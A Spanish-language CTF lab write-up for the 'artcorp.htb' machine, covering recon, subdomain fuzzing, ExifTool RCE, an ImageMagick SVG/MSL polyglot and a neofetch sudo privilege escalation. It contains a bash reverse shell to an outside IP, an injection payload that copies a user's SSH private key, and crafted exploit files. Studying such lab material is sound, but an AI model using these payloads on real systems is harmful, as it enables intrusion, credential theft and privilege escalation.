------
- Tags: #subdomain #file-upload #exiftool #image-magick #neofetch 
- -------
## Técnicas utilizadas
- Subdomain Enumeration  
- Abusing File Upload  
- Exiftool Exploitation [RCE]  
- ImageMagick Exploitation [User Pivoting] - SVG MSL Polyglot File  
- Abusing Neofetch [Privilege Escalation]
## Procedimiento

![[Pasted image 20230801170558.png]]

#### Reconocimiento
Un escaneo con **nmap** sobre el host nos muestra los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 10.10.11.140 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 18:51 UTC
Nmap scan report for 10.10.11.140
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
|_  256 05e9df71b59f25036bd0468d05454420 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```

Si lanzamos un **whatweb** sobre el aplicativo web, observamos las siguientes tecnologías corriendo por detrñas:
```ruby
# whatweb 10.10.11.140
http://10.10.11.140 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.140], RedirectLocation[http://artcorp.htb]
http://artcorp.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.140], Title[Home]
```

-----------------
#### Subdomain Enumeration 
Con el dominio que nos ofrecen, podemos enumerar **Subdominios** con **Wfuzz** o **Gobuster** y encontramos el siguiente:
```python
❯ wfuzz -c --hc=404 --hh=0 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://artcorp.htb -H 'Host: FUZZ.artcorp.htb'

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://artcorp.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000001492:   200        9 L      24 W       247 Ch      "dev01"
```

Dentro de este nuevo subdominio, encontramos simplemente un **Uploader** de imagenes.

------------
#### Abusing File Upload
Al subir una imagen dada, podemos ver el tipico **output** de la herramienta **ExifTool**:
![[Pasted image 20230801194452.png]]


--------------
#### Exiftool Exploitation [RCE]  
El problema recae en que este **output** en especial no representa la versión en uso, pero podemos ir a ciegas probando. El siguiente [articulo](https://github.com/OneSecCyber/JPEG_RCE) muestra como podriamos explotar dicha herramienta.
La explotación consistiria en clonarnos el repositorio y ejecutar el siguiente comando:
```json
# exiftool -config eval.config runme.jpg -eval='system("echo e0293u1ekjwkjna | base64 -d | bash")'
```

Donde la data en base64 seria el tipico oneliner que nos ejecuta una reverse shell:
```json
# bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'
```

---------
#### ImageMagick Exploitation [User Pivoting] - SVG MSL Polyglot File 

Con **Pspy** podemos observar el siguiente proceso:
![[Pasted image 20230801195131.png]]

Si vemos que es ese comando, nos damos cuenta que es un binario de ImageMagick. Este comando se esta aplicando a todos los archivos que se encuntren en **Convert_Images**, asi que podemos aprovecharnos de esto para crear una **.mvg** malcioso tal y como lo hicimos en la maquina [[Most Imporant - Ariekei|Arikei]]:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```

Sin embargo, vemos que no funciona. Podemos hacer lo que viene en este [recurso](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). Basicamente nos dice de crear un archivo **SVG** malicioso:
```xml
<image authenticate='ff" `cat /home/thomas/.ssh/id_rsa > /dev/shm/putita`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Y confirmamos la ejecución de comandos.

------------
#### Abusing Neofetch [Privilege Escalation]
Como el usuario **Thomas** contamos con un privilegio a nivel de Sudoers que nos permite ejecutar **Neofetch** como cualquier usuario del sistema:
```
Image Sudoers Privesc
```

Pues bien, **NeoFetch** cuenta con un archivo de configuración que se encuentra en **~/.config/neofetch/config.conf** en el cual podemos colar un comando pero antes de hacerlo, debemos alterar la variable de entorno XDG_CONFIG_HOME (tenemos permisos de hacerlo) a **/home/thomas/.config/** y ahora si podemos ejecutar el comando:
```
# sudo neofetch
```